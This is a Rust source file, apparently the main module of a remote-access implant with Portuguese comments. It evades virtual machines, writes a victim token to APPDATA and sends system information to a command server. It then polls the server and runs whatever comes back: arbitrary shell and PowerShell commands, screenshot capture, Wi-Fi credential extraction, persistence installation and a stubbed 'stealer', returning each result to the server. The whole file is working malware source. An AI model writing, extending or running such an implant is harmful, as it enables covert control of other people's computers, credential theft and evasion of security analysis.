mod config;
mod token;
mod antvm;
mod info;
mod wifi;
mod printscrn;
mod persistence;
use config::{debug_log, URL, TIME};
use token::generate_key;
use antvm::check;
use info::infos;
use serde_json::Value;
use std::fs::File;
use std::io::{Write, BufRead, BufReader};
use std::path::Path;
use std::env;
use std::process;
use wifi::extract_wifi;
use persistence::install;
use std::sync::Mutex;
use std::path::PathBuf;
use printscrn::take_screenshot;

// Estado global para manter o diretório atual
static CURRENT_DIR: Mutex<Option<PathBuf>> = Mutex::new(None);

fn clean_for_utf8(input: &str) -> String {
    input.chars()
        .map(|c| {
            if c.is_ascii() {
                if c.is_control() && c != '\n' && c != '\r' && c != '\t' {
                    ' '
                } else {
                    c
                }
            } else {
                ' '
            }
        })
        .collect()
}

fn command_execution(cmd: &str) -> String {
    use std::process::Command;

    // Função auxiliar para obter o diretório atual
    let get_current_dir = || {
        let dir_lock = CURRENT_DIR.lock().unwrap();
        match dir_lock.as_ref() {
            Some(dir) => dir.clone(),
            None => env::current_dir().unwrap_or_else(|_| PathBuf::from("C:\\"))
        }
    };

    let update_current_dir = |new_dir: PathBuf| {
        let mut dir_lock = CURRENT_DIR.lock().unwrap();
        *dir_lock = Some(new_dir);
    };

    let cmd_trimmed = cmd.trim();
    if cmd_trimmed.starts_with("cd ") || cmd_trimmed == "cd" {
        let target_dir = if cmd_trimmed == "cd" {
            env::var("USERPROFILE").unwrap_or_else(|_| "C:\\".to_string())
        } else {
            cmd_trimmed[3..].trim().to_string()
        };

        let current_dir = get_current_dir();
        let new_path = if Path::new(&target_dir).is_absolute() {
            PathBuf::from(&target_dir)
        } else {
            current_dir.join(&target_dir)
        };

        match new_path.canonicalize() {
            Ok(canonical_path) => {
                if canonical_path.exists() && canonical_path.is_dir() {
                    update_current_dir(canonical_path.clone());
                    return format!("Directory changed to: {}", canonical_path.display());
                } else {
                    return format!("Directory not found: {}", target_dir);
                }
            }
            Err(_) => return format!("Invalid path: {}", target_dir),
        }
    }

    if cmd_trimmed == "pwd" {
        let current_dir = get_current_dir();
        return format!("Current Directory: {}", current_dir.display());
    }

    if cmd_trimmed == "ls" || cmd_trimmed == "dir" {
        let current_dir = get_current_dir();
        let cmd_to_run = if cfg!(target_os = "windows") {
            "Get-ChildItem | Format-Table -AutoSize"
        } else {
            "ls -la"
        };
        
        let output = if cfg!(target_os = "windows") {
            Command::new("powershell")
                .current_dir(&current_dir)
                .args(["-Command", cmd_to_run])
                .output()
        } else {
            Command::new("sh")
                .current_dir(&current_dir)
                .arg("-c")
                .arg(cmd_to_run)
                .output()
        };

        match output {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                return format!("Directory: {}\n\n{}", current_dir.display(), stdout);
            }
            Err(e) => return format!("Failed to list directory: {}", e),
        }
    }

    let current_dir = get_current_dir();
    let output = if cfg!(target_os = "windows") {
        Command::new("powershell")
            .current_dir(&current_dir)
            .args(["-Command", cmd])
            .output()
    } else {
        Command::new("sh")
            .current_dir(&current_dir)
            .arg("-c")
            .arg(cmd)
            .output()
    };

    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            let result = if !stdout.is_empty() {
                stdout.to_string()
            } else if !stderr.is_empty() {
                stderr.to_string()
            } else {
                "Command executed successfully with no output".to_string()
            };

            format!("Current Directory: {}\n\n{}", current_dir.display(), result)
        }
        Err(e) => format!("Failed to execute command: {}", e),
    }
}

async fn send_infos(data: &Value) -> Result<bool, String> {
    let client = reqwest::Client::new();
    let url = format!("{}/implants/", URL);
       
    match client
        .post(&url)
        .json(data)
        .send()
        .await
    {
        Ok(response) => {
            let status = response.status();
            if status.is_success() {
                debug_log("Send data success!");
                Ok(true)
            } else {
                let error_msg = format!("Error HTTP: {}", status);
                debug_log(&error_msg);
                Err(error_msg)
            }
        }
        Err(e) => {
            let error_msg = format!("Error sending data: {}", e);
            debug_log(&error_msg);
            Err(error_msg)
        }
    }

    
}

async fn send_command(token: &str, command: &serde_json::Value) -> Result<(), String> {
    let client = reqwest::Client::new();
    let url = format!("{}/implants/result/{}/", URL, token);
    let response = client.post(&url)
        .json(command)
        .send()
        .await;
    match response {
        Ok(res) => {
            if res.status().is_success() {
                Ok(())
            } else {
                Err(format!("Failed to send command: {}", res.status()))
            }
        }
        Err(e) => Err(format!("Error sending command: {}", e)),
    }
}

async fn pong(msg: &str, cmd: &str, token: &str){

    let response_cmd = serde_json::json!({
        "msg": "Command executed",
        "command": cmd,
        "output": msg
    });
    if let Err(e) = send_command(&token, &response_cmd).await {
        debug_log(&format!("[-] Failed to send command result: {}", e));
    }
}

async fn ping(token: &str) {
    let client = reqwest::Client::new();
    let mut sleep_time = TIME;
    loop {
        let url = format!("{}/implants/ping/{}", URL, token);
        let res = client.get(&url).send().await;

        match res {
            Ok(response) => {
                let status = response.status();
                let body = response.text().await.unwrap_or_default();

                if status == reqwest::StatusCode::OK {
                    debug_log(&format!("GET Response:\n{}", body));
                    let response_json: Value = serde_json::from_str(&body).unwrap_or(Value::Null);
                    if let Some(cmd) = response_json.get("cmd").and_then(|v| v.as_str()) {
                        debug_log(&format!("[+] Received command: {}", cmd));
                        match cmd {
                            "desktop" => {
                                let pic_url = tokio::task::spawn_blocking(|| take_screenshot())
                                    .await
                                    .unwrap_or_else(|_| "Erro".to_string());
                                pong(&pic_url, cmd, &token).await;
                            }
                            "wifi" => {
                                debug_log("[+] Executing wifi command...");
                                let wifi_info = extract_wifi();
                                debug_log(&wifi_info);
                                pong(&wifi_info, cmd, &token).await;
                            }
                            "stealer" => {
                                debug_log("[!] not working....");
                            }
                            "persistence" => {

                                debug_log("[+] Executing persistence command...");

                                match install(){
                                    Ok(_) => {
                                        debug_log("[+] Persistence installed successfully.");
                                        pong("[+] Persistence installed", cmd, &token).await;
                                    }
                                    Err(e) => {
                                        debug_log(&format!("[!] Failed to install persistence: {}", e));
                                        pong(&format!("[!] Failed to install persistence: {}", e), cmd, &token).await;
                                    }
                                }
                            }
                            _ => {
                                debug_log(&format!("[+] Executing shell command: {}", cmd));
                                let output = command_execution(cmd);
                                debug_log(&format!("[+] Command output: {}", output));

                                let mut output = clean_for_utf8(&output);
                                if output.len() > 4000 {
                                    output = format!("{}\n[... output truncated ...]", &output[..4000]);
                                }
                                pong(&output, cmd, &token).await;
                            }
                        }
                    }

                    // Verifica se há mudança no tempo de sleep
                    if let Some(sleep) = response_json.get("sleep").and_then(|v| v.as_i64()) {
                        sleep_time = sleep as u64;
                        debug_log(&format!("[+] Sleep time updated to: {} seconds", sleep_time));
                    }

                    tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
                    // Continue o loop em vez de retornar
                } else if status == reqwest::StatusCode::GONE {
                    debug_log("[!] Implant was removed from server. Exiting...");
                    std::process::exit(0);
                } else {
                    debug_log(&format!("Ping failed with status: {}", status));
                    tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
                }
            }
            Err(_) => {
                debug_log("Failed to connect to server");
                tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
            }
        }
    }
}

#[tokio::main]
async fn main() {
    debug_log("[+] Starting up...");
    if check() {
        debug_log("[!] Anti-VM checks failed.");
        return;
    }
    debug_log("[+] All checks passed.");

    // Create a new token if it doesn't exist
    let appdata = match env::var("APPDATA") {
        Ok(path) => path,
        Err(_) => {
            debug_log("Failed to get APPDATA environment variable.");
            process::exit(1);
        }
    };
    let token_file = format!("{}\\.env", appdata);
    debug_log(&token_file);

    // Check if the .env file exists, if not, create it
    if !Path::new(&token_file).exists() {
        let mut file = match File::create(&token_file) {
            Ok(file) => file,
            Err(_) => {
                debug_log("Failed to create .env file.");
                process::exit(1);
            }
        };
        // Generate a new TOKEN and write it to the .env file
        let code = generate_key();
        debug_log(&code);
        
        if let Err(_) = file.write_all(code.as_bytes()) {
            debug_log("Failed to write to .env file.");
            process::exit(1);
        }
    }

    // Read the token from the .env file
    let file = match File::open(&token_file) {
        Ok(file) => file,
        Err(_) => {
            eprintln!("Failed to open .env file.");
            process::exit(1);
        }
    };
    
    let mut token = String::new();
    let mut reader = BufReader::new(file);
    
    if let Err(_) = reader.read_line(&mut token) {
        eprintln!("Failed to read token from .env file.");
        process::exit(1);
    }
    // Remove newline character if present
    token = token.trim().to_string();
    
    if token.is_empty() {
        eprintln!("Token is empty. Exiting...");
        process::exit(1);
    }
    debug_log(&format!("Token loaded: {}", token));

    // Coletar informações do sistema
    let system_info = infos(&token).await;
    debug_log("System info collected.");

    // Enviar dados para o servidor uma vez
    if let Err(e) = send_infos(&system_info).await {
        debug_log(&format!("Error sending data: {}", e));
    }
    // Inicia o loop de ping
    ping(&token).await;
}
